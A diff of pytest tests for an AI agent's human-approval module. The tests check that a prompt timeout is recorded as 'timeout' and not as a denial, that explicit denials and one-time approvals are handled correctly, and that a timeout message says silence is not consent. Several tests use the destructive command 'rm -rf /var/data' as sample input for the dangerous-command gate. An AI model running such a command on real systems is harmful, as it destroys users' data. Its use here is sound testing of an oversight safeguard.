+    @pytest.fixture(autouse=True)
+    def _cli_session(self, monkeypatch):
+        for var in ("HERMES_CRON_SESSION", "HERMES_GATEWAY_SESSION", "HERMES_EXEC_ASK", "HERMES_SESSION_PLATFORM"):
+            monkeypatch.delenv(var, raising=False)
+        monkeypatch.setenv("HERMES_INTERACTIVE", "1")
 
-    def _interactive_env(self):
-        return mock_patch.dict(
-            "os.environ",
-            {"HERMES_INTERACTIVE": "1"},
-            clear=False,
-        )
+    @staticmethod
+    def _ask(answer):
+        from tools import approval as mod
+        return mod.request_draft_approval(
+            text="Hello there", description="Send a message", pattern_key="draft:test", draft={"kind": "message"},
+            approval_callback=lambda *a, **kw: answer)
 
     def test_prompt_returns_timeout_when_input_never_arrives(self):
-        """The raw input() path returns 'timeout', not 'deny', on expiry."""
         import builtins
-        from unittest.mock import patch as _patch
 
         def _hang(_prompt=""):
             time.sleep(10)
             return ""
 
-        with _patch.object(builtins, "input", _hang):
-            result = prompt_dangerous_approval(
-                "rm -rf /var/data", "recursive delete",
-                timeout_seconds=0.05,
-            )
-        assert result == "timeout"
+        with mock_patch.object(builtins, "input", _hang):
+            assert prompt_dangerous_approval("rm -rf /var/data", "recursive delete", timeout_seconds=0.05) == "timeout"
 
-    def test_guard_classifies_callback_timeout_as_timeout(self, monkeypatch):
-        """check_all_command_guards: a 'timeout' choice from the CLI callback
-        yields outcome='timeout' and a no-response message, not 'denied by
-        user'."""
-        from unittest.mock import patch as _patch
-        from tools import approval as mod
-
-        mod._session_approved.clear()
-        mod._permanent_approved.clear()
-
-        cfg = {"approvals": {"mode": "manual"}}
-        with self._interactive_env():
-            with _patch("hermes_cli.config.load_config_readonly", return_value=cfg):
-                result = mod.check_all_command_guards(
-                    "rm -rf /var/data", "local",
-                    approval_callback=lambda *a, **kw: "timeout",
-                )
-
-        assert result["approved"] is False
-        assert result.get("outcome") == "timeout"
+    def test_callback_timeout_is_not_a_denial(self):
+        result = self._ask("timeout")
+        assert result["approved"] is False and result.get("outcome") == "timeout"
         assert result.get("user_consent") is False
-        msg = result["message"]
-        assert "timed out without user response" in msg
-        assert "Silence is not consent" in msg
-        assert "denied" not in msg.lower()
+        assert "timed out without a decision" in result["message"] and "Silence is not consent" in result["message"]
 
-    def test_guard_still_classifies_explicit_deny_as_denied(self):
-        """Explicit CLI deny keeps outcome='denied' and the denial wording."""
-        from unittest.mock import patch as _patch
-        from tools import approval as mod
+    def test_explicit_deny_is_a_denial(self):
+        result = self._ask("deny")
+        assert result["approved"] is False and result.get("outcome") == "denied"
+        assert "discarded" in result["message"] and "Silence is not consent" not in result["message"]
 
-        mod._session_approved.clear()
-        mod._permanent_approved.clear()
-
-        cfg = {"approvals": {"mode": "manual"}}
-        with self._interactive_env():
-            with _patch("hermes_cli.config.load_config_readonly", return_value=cfg):
-                result = mod.check_all_command_guards(
-                    "rm -rf /var/data", "local",
-                    approval_callback=lambda *a, **kw: "deny",
-                )
-
-        assert result["approved"] is False
-        assert result.get("outcome") == "denied"
-        assert "denied" in result["message"].lower()
-        assert "Silence is not consent" not in result["message"]
-
-    def test_run_approval_gate_cli_timeout_is_not_a_denial(self):
-        """The shared plugin-escalation gate (_run_approval_gate) also
-        distinguishes a prompt timeout from an explicit deny on the CLI
-        path."""
-        from unittest.mock import patch as _patch
-        from tools import approval as mod
-
-        mod._session_approved.clear()
-        mod._permanent_approved.clear()
-
-        cfg = {"approvals": {"mode": "manual"}}
-        with self._interactive_env():
-            with _patch("hermes_cli.config.load_config_readonly", return_value=cfg):
-                result = mod.request_tool_approval(
-                    "write_file", "plugin flagged this write",
-                    approval_callback=lambda *a, **kw: "timeout",
-                )
-
-        assert result["approved"] is False
-        assert result.get("outcome") == "timeout"
-        assert result.get("user_consent") is False
-        assert "timed out without user response" in result["message"]
-        assert "Silence is not consent" in result["message"]
+    def test_once_approves(self):
+        assert self._ask("once")["approved"] is True
